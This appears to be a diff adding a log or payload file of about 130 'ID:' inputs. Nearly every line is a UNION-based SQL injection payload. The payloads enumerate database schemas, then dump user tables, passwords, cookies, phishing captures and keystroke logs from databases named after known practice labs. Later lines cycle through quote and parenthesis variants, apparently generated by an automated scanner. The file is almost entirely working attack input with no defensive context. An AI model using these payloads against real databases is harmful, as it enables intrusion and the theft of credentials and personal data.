@@ -1,0 +1,131 @@
+ID:1
+ID:10
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,concat('tables:',group_concat(table_name)),3 from information_schema.tables where table_schema= 'challenges'; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'UW2GYZ3EJ3' and table_schema='challenges'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',sessid,'|',secret_BPI9,'|',tryy)),3 from challenges.UW2GYZ3EJ3; -- 
+ID:-1') union select 1,concat('tables:',group_concat(table_name)),3 from information_schema.tables where table_schema= 'pikachu'; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'httpinfo' and table_schema='pikachu'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',userid,'|',ipaddress,'|',useragent,'|',httpaccept,'|',remoteport)),3 from pikachu.httpinfo; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'member' and table_schema='pikachu'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',username,'|',pw,'|',sex,'|',phonenum,'|',address,'|',email)),3 from pikachu.member; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'message' and table_schema='pikachu'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',content,'|',time)),3 from pikachu.message; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'users' and table_schema='pikachu'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',username,'|',password,'|',level)),3 from pikachu.users; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'xssblind' and table_schema='pikachu'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',time,'|',content,'|',name)),3 from pikachu.xssblind; -- 
+ID:-1') union select 1,concat('tables:',group_concat(table_name)),3 from information_schema.tables where table_schema= 'pkxss'; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'cookies' and table_schema='pkxss'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',time,'|',ipaddress,'|',cookie,'|',referer,'|',useragent)),3 from pkxss.cookies; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'fish' and table_schema='pkxss'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',time,'|',username,'|',password,'|',referer)),3 from pkxss.fish; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'keypress' and table_schema='pkxss'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',data)),3 from pkxss.keypress; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'users' and table_schema='pkxss'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',username,'|',password,'|',level)),3 from pkxss.users; -- 
+ID:-1') union select 1,concat('tables:',group_concat(table_name)),3 from information_schema.tables where table_schema= 'security'; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'emails' and table_schema='security'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',email_id)),3 from security.emails; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'referers' and table_schema='security'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',referer,'|',ip_address)),3 from security.referers; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'uagents' and table_schema='security'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',uagent,'|',ip_address,'|',username)),3 from security.uagents; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'users' and table_schema='security'; -- 
+ID:-1') union select 1,concat('items:',group_concat(id,'|',username,'|',password)),3 from security.users; -- 
+ID:-1') union select 1,concat('tables:',group_concat(table_name)),3 from information_schema.tables where table_schema= 'test'; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'users' and table_schema='test'; -- 
+ID:-1') union select 1,concat('items:',group_concat(account,'|',password,'|',name)),3 from test.users; -- 
+ID:-1') union select 1,concat('tables:',group_concat(table_name)),3 from information_schema.tables where table_schema= 'testt'; -- 
+ID:-1') union select 1,concat('tables:',group_concat(table_name)),3 from information_schema.tables where table_schema= 'www'; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'goods' and table_schema='www'; -- 
+ID:-1') union select 1,concat('items:',group_concat(name,'|',price,'|',amount,'|',seller)),3 from www.goods; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'orders' and table_schema='www'; -- 
+ID:-1') union select 1,concat('items:',group_concat(goodname,'|',buyamount,'|',price,'|',address,'|',buyeraccount,'|',selleraccount,'|',accepted)),3 from www.orders; -- 
+ID:-1') union select 1,concat('columns:',group_concat(column_name)),3 from information_schema.columns where table_name= 'users' and table_schema='www'; -- 
+ID:-1') union select 1,concat('items:',group_concat(email,'|',tel,'|',password,'|',name,'|',type)),3 from www.users; -- 
+ID:-1 union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,(select concat('tables:',group_concat(table_name)) from information_schema.tables where table_schema= 'challenges'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'UW2GYZ3EJ3' and table_schema='challenges'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',sessid,'|',secret_BPI9,'|',tryy)) from challenges.UW2GYZ3EJ3),3 and ('') = (' 
+ID:-1') union select 1,(select concat('tables:',group_concat(table_name)) from information_schema.tables where table_schema= 'pikachu'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'httpinfo' and table_schema='pikachu'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',userid,'|',ipaddress,'|',useragent,'|',httpaccept,'|',remoteport)) from pikachu.httpinfo),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'member' and table_schema='pikachu'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',username,'|',pw,'|',sex,'|',phonenum,'|',address,'|',email)) from pikachu.member),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'message' and table_schema='pikachu'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',content,'|',time)) from pikachu.message),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'users' and table_schema='pikachu'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',username,'|',password,'|',level)) from pikachu.users),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'xssblind' and table_schema='pikachu'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',time,'|',content,'|',name)) from pikachu.xssblind),3 and ('') = (' 
+ID:-1') union select 1,(select concat('tables:',group_concat(table_name)) from information_schema.tables where table_schema= 'pkxss'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'cookies' and table_schema='pkxss'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',time,'|',ipaddress,'|',cookie,'|',referer,'|',useragent)) from pkxss.cookies),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'fish' and table_schema='pkxss'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',time,'|',username,'|',password,'|',referer)) from pkxss.fish),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'keypress' and table_schema='pkxss'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',data)) from pkxss.keypress),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'users' and table_schema='pkxss'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',username,'|',password,'|',level)) from pkxss.users),3 and ('') = (' 
+ID:-1') union select 1,(select concat('tables:',group_concat(table_name)) from information_schema.tables where table_schema= 'security'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'emails' and table_schema='security'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',email_id)) from security.emails),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'referers' and table_schema='security'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',referer,'|',ip_address)) from security.referers),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'uagents' and table_schema='security'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',uagent,'|',ip_address,'|',username)) from security.uagents),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'users' and table_schema='security'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(id,'|',username,'|',password)) from security.users),3 and ('') = (' 
+ID:-1') union select 1,(select concat('tables:',group_concat(table_name)) from information_schema.tables where table_schema= 'test'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'users' and table_schema='test'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(account,'|',password,'|',name)) from test.users),3 and ('') = (' 
+ID:-1') union select 1,(select concat('tables:',group_concat(table_name)) from information_schema.tables where table_schema= 'testt'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('tables:',group_concat(table_name)) from information_schema.tables where table_schema= 'www'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'goods' and table_schema='www'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(name,'|',price,'|',amount,'|',seller)) from www.goods),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'orders' and table_schema='www'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(goodname,'|',buyamount,'|',price,'|',address,'|',buyeraccount,'|',selleraccount,'|',accepted)) from www.orders),3 and ('') = (' 
+ID:-1') union select 1,(select concat('columns:',group_concat(column_name)) from information_schema.columns where table_name= 'users' and table_schema='www'),3 and ('') = (' 
+ID:-1') union select 1,(select concat('items:',group_concat(email,'|',tel,'|',password,'|',name,'|',type)) from www.users),3 and ('') = (' 
+ID:-1 union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('aWI37Mb1Xs:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('aWI37Mb1Xs:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('aWI37Mb1Xs:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('aWI37Mb1Xs:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('vhGmEbXVyZ:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('vhGmEbXVyZ:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('vhGmEbXVyZ:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('vhGmEbXVyZ:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('UquDPM3IBv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('b1oPm6w9ci:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('CeJ5wzcDMj:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('CeJ5wzcDMj:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('CeJ5wzcDMj:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('CeJ5wzcDMj:',group_concat(schema_name)) from information_schema.schemata -- 
